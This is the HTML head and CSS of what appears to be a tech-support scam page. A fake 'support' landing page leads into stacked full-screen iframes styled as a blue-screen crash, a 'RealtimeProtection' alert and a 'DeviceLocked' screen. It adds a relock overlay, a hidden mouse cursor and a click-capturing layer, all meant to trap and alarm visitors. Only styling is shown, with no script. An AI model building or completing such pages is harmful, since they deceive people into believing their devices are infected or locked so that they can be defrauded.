<head>

    <style>
        /* --- CORE DEVICE SETTINGS --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            cursor: default;
            /* Default visible cursor for landing page */
        }

        /* --- PROFESSIONAL LANDING PAGE (Context 0) --- */
        #landing-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://images.unsplash.com/photo-1497366216548-37526070297c?q=80&w=2069');
            background-size: cover;
            background-position: center;
            z-index: 10;
            transition: filter 0.8s ease;
            overflow-y: auto;
            cursor: pointer;
            /* Explicit pointer cursor for landing */
        }

        header {
            background: #000;
            padding: 25px 8%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 6px solid #fdb927;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .gs-logo {
            height: 65px;
        }

        .support-tag {
            color: #fdb927;
            font-weight: 900;
            font-size: 18px;
            text-transform: uppercase;
        }

        .hero {
            padding: 120px 8%;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            color: white;
            max-width: 950px;
        }

        .hero h1 {
            font-size: 72px;
            font-weight: 900;
            line-height: 1.1;
            margin-bottom: 25px;
            text-shadow: 2px 2px 15px rgba(0, 0, 0, 0.8);
        }

        .hero p {
            font-size: 20px;
            line-height: 1.6;
            margin-bottom: 40px;
            background: rgba(0, 0, 0, 0.5);
            padding: 25px;
            border-left: 6px solid #fdb927;
        }

        .cta-btn {
            background: #fdb927;
            color: #000;
            padding: 25px 65px;
            font-weight: 900;
            border: 4px solid #000;
            text-transform: uppercase;
            box-shadow: 12px 12px 0px #000;
            font-size: 22px;
            pointer-events: all;
            cursor: pointer;
        }

        /* --- IFRAME STACKING ENGINE --- */
        #stack-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 100;
            pointer-events: none;
            /* Allow clicks to pass through initially */
        }

        .popup-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            background: transparent;
            opacity: 0;
            /* Start hidden */
            transition: opacity 0.2s ease-in;
            pointer-events: none;
            /* Initially non-interactive */
        }

        .popup-frame.active {
            opacity: 1;
            pointer-events: all;
            /* Make active frame interactive */
        }

        /* Layer Specifics */
        #frame-1-bsod {
            z-index: 200;
            /* Ranintoprob */
        }

        #frame-2-realtime {
            z-index: 300;
            /* RealtimeProtection */
            width: 100% !important;
            height: 100% !important;
            left: 0 !important;
            top: 0 !important;
        }

        #frame-3-locked {
            z-index: 400;
            /* DeviceLocked */
            width: 100% !important;
            height: 100% !important;
            left: 0 !important;
            top: 0 !important;
        }

        #frame-4-vertical {
            z-index: 500;
            width: 100% !important;
            height: 100% !important;
            left: 0 !important;
            top: 0 !important;
            transform: none !important;
            box-shadow: none;
            background: transparent;
        }

        #frame-5-hori {
            z-index: 600;
            width: 100% !important;
            height: 100% !important;
            left: 0 !important;
            top: 0 !important;
            transform: none !important;
            box-shadow: none;
            background: transparent;
        }

        @media (max-width: 768px) {
            .hero h1 {
                font-size: 36px;
            }

            .hero p {
                font-size: 16px;
                padding: 15px;
            }

            .cta-btn {
                padding: 15px 30px;
                font-size: 16px;
            }

            header {
                padding: 15px 5%;
            }

            .gs-logo {
                height: 40px;
            }

            .support-tag {
                font-size: 14px;
            }
        }

        /* RELOCK OVERLAY */
        #relock-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 2000000;
            display: none;
            /* Hidden by default */
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #d83b01;
            font-family: 'Segoe UI', sans-serif;
            text-align: center;
            cursor: pointer;
        }


        /* --- CURSOR CONTROL CLASSES --- */
        body.cursor-hidden {
            cursor: none !important;
        }

        /* Forcing cursor hidden on iframes too via wrapper if needed, 
            but strictly mostly handled by iframe content or this container */
        #stack-container.force-no-cursor {
            cursor: none !important;
        }


        /* EMERGENCY OVERLAY (Optional) */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 999999;
            display: none;
            /* Used to capture clicks for next step if iframe eats them */
        }
    </style>
</head>
